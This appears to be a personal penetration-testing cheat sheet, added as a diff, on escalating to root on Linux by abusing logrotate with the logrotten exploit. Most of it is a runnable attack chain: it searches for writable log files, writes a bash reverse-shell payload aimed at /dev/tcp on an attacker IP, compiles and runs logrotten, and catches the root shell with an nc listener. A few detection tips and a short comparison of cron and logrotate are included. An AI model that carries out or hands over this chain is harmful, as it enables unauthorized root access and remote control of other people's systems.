@@ -1,0 +1,186 @@
+🧠 Summary – Logrotate Exploitation
+logrotate is a tool designed to manage log files by rotating, compressing, or deleting them based on size or age. It's typically triggered by cron, and misconfigurations or vulnerable versions can be exploited to execute malicious payloads as root.
+
+🧭 Got This? Do That.
+✅ Got This:
+Writable log file
+
+Logrotate runs as root (via cron)
+
+Vulnerable logrotate version (e.g., 3.8.6, 3.11.0, 3.15.0, 3.18.0)
+
+Logrotate uses create or compress directives
+
+Exploit tool: logrotten
+
+🚀 Do That:
+Check for logrotate on system
+
+bash
+Copy
+Edit
+logrotate --version
+Read the global config file
+
+bash
+Copy
+Edit
+cat /etc/logrotate.conf
+Look for:
+
+create → creates new empty logs after rotation
+
+compress → compresses logs after rotation
+
+List all logrotate targets
+
+bash
+Copy
+Edit
+ls /etc/logrotate.d/
+Check which log file you can write to
+
+bash
+Copy
+Edit
+find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+Check logrotate status
+
+bash
+Copy
+Edit
+cat /var/lib/logrotate.status
+Set up your payload
+
+bash
+Copy
+Edit
+echo 'bash -i >& /dev/tcp/<YOUR-IP>/9001 0>&1' > payload
+Clone and compile logrotten
+
+bash
+Copy
+Edit
+git clone https://github.com/whotwagner/logrotten.git
+cd logrotten
+gcc logrotten.c -o logrotten
+Start a listener
+
+bash
+Copy
+Edit
+nc -nlvp 9001
+Run logrotten
+
+bash
+Copy
+Edit
+./logrotten -p ./payload /path/to/writeable.log
+Wait for the cronjob to trigger logrotate (or force it)
+
+bash
+Copy
+Edit
+sudo logrotate -f /etc/logrotate.conf
+🛠 Exploit Logic
+Logrotate’s create option mishandles permissions and allows arbitrary file creation.
+
+When executed with a malicious payload in place of a log file, the next cron-triggered rotation executes that payload as root.
+
+🔐 Detection Tips
+Watch for unauthorized modifications in /var/lib/logrotate.status
+
+Unexpected new files in /tmp or writeable paths
+
+Cron activity running outside expected times
+
+🔥 Sample Attack Chain
+bash
+Copy
+Edit
+# 1. Find a writable log
+find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+
+# 2. Confirm vulnerable logrotate version
+logrotate --version
+
+# 3. Setup payload
+echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
+
+# 4. Compile logrotten
+gcc logrotten.c -o logrotten
+
+# 5. Start listener
+nc -nlvp 9001
+
+# 6. Run exploit
+./logrotten -p ./payload /tmp/vuln.log
+
+# 7. Wait for reverse shell
+🧠 Memory Hook
+"Logrotate rotates logs, but it might also rotate you into root if it's vulnerable."
+
+
+🧠 Difference Between cron and logrotate
+Feature	cron	logrotate
+What it is	A scheduler that runs commands/scripts on a timer	A log manager that rotates, compresses, or deletes logs
+Config Location	crontab, /etc/crontab, /etc/cron.* dirs	/etc/logrotate.conf, /etc/logrotate.d/*
+Who triggers it	Runs any script as scheduled (you choose the command)	Gets called by cron itself, usually daily
+Scope	Can run anything: reverse shells, backups, cleanup	Strictly deals with log files
+Privilege escalation	Write a reverse shell into a script it runs as root	Abuse writable log files + vulnerable logrotate version
+Common Use	Daily backups, reboots, periodic tasks	Rotating logs like /var/log/syslog, /var/log/auth.log
+🔍 How to Know If logrotate Is Vulnerable
+There are two ways to think about this:
+
+1. 🔥 Version-Based Vulnerabilities
+Some specific logrotate versions are known to be vulnerable:
+
+✅ 3.8.6
+
+✅ 3.11.0
+
+✅ 3.15.0
+
+✅ 3.18.0
+
+Check the version:
+
+bash
+Copy
+Edit
+logrotate --version
+If you're on one of those versions, and you have a writable log file, it's very likely exploitable with logrotten.
+
+⚠️ But even newer versions might be vulnerable if they're misconfigured or if protections aren't in place!
+
+2. 🧪 Test-Based (Safer & Smarter)
+Even without version knowledge, just check:
+
+✅ Do you have write access to a log file that's rotated by root?
+(Use find / -writable -type f -name "*.log")
+
+✅ Is logrotate using the create or compress directive?
+(Check with cat /etc/logrotate.conf)
+
+✅ Is logrotate triggered regularly?
+(Usually run by root's cron daily: check /etc/cron.daily/logrotate)
+
+If yes to those: try the exploit manually or with logrotten. You can always use the -d (debug) mode to test without risk:
+
+bash
+Copy
+Edit
+sudo logrotate -d /etc/logrotate.conf
+🔄 TL;DR Recap
+cron = can execute any script, often the root of scheduled root-shell attacks.
+
+logrotate = specific cron job for log maintenance, exploitable if:
+
+You can write to a log
+
+It uses vulnerable directives
+
+It runs as root
+
+
+
